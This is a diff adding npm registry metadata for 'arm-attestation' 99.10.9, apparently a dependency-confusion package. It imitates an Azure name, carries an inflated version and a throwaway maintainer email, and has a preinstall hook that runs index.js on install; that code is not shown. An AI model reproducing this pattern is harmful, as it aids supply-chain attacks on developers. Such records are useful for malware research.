@@ -1,0 +1,62 @@
+{
+    "_id": "arm-attestation",
+    "name": "arm-attestation",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-attestation",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-attestation@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-zWuXbkLPFRri057aj/VH6VSqFLowjXFvlhiwOK1/TS6b/Wgn09lA6N4h2FY8oEhSM3azJF6UwiXWok2XX/AgPw==",
+                "shasum": "b13f7661b666b7bcd9a151730799cfa369a3230a",
+                "tarball": "https://registry.npmjs.org/arm-attestation/-/arm-attestation-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5067,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNm1PACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpnuw//Xsi+fKkivuGUwMMkOfmRhR3wZMswM5VuQkx8nOWMgZLkOl1b\r\n+JXzlvPO2bePYDADk7xcF9IC9yQeBTY5N6/Cm7x9Fj2HlgRhj8hvMCXobpJP\r\nXB+RenROhDuZJ5jU27qcV0rO4z6+ci8ovu4jw8FKf9zyze5gpPlsdwPW34ca\r\nwXsEKnhb4qdlrpa2FyYr4iXwVtxQhE1hD/jNB+HQhHO6GEZgMPATPaANVyTj\r\nRjqhYqe84ByqcaAUI77BKQbkZtC9pEGB+U6DLvl5lgthz3QntXwkJKFmzr7/\r\nmkgDLU87QVrEn5w+razsEzc0aGmkfcIbTJcU1tkb3eLKHLYvK/ayrgrcrU7c\r\n5R1hjGMOgIUpe8FXIFWJJLVz8zldW9BtVQ72JOpLccRvDkDaycsLjmOARoyL\r\nCvPbapdEOWeXoZOYdP7eARIelZmqpMkSPz4F+cV77Kaz1bl3PfoSd+8H+CrI\r\nSZD9iVh7r3BvqN3bI0oOahtXbuk451Rh0s7Gi9Lifw/8KAd/I3ZJToXqnGNV\r\nVmCEI4Cvi6IEPXvEI/7NgZYX/EEfxoHRvbKLaJLIyLy9BgpaNbYBA1wSPfbP\r\neEi4zWcqr2w+78LNS8qMjRYnuMST/y1sCHV4pmxAg/YN/iom6QbBXVf8Y0r6\r\nbcDKQz5xFSvetB0VT0qhsJpsboGRSD5F/bc=\r\n=LzvT\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "6oj63dkq",
+                "email": "6oj63dkq@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "6oj63dkq",
+                    "email": "6oj63dkq@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-attestation_99.10.9_1647734094880_0.6855123606089231"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T23:54:54.879Z",
+        "99.10.9": "2022-03-19T23:54:55.001Z",
+        "modified": "2022-03-19T23:54:55.098Z"
+    },
+    "maintainers": [
+        {
+            "name": "6oj63dkq",
+            "email": "6oj63dkq@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
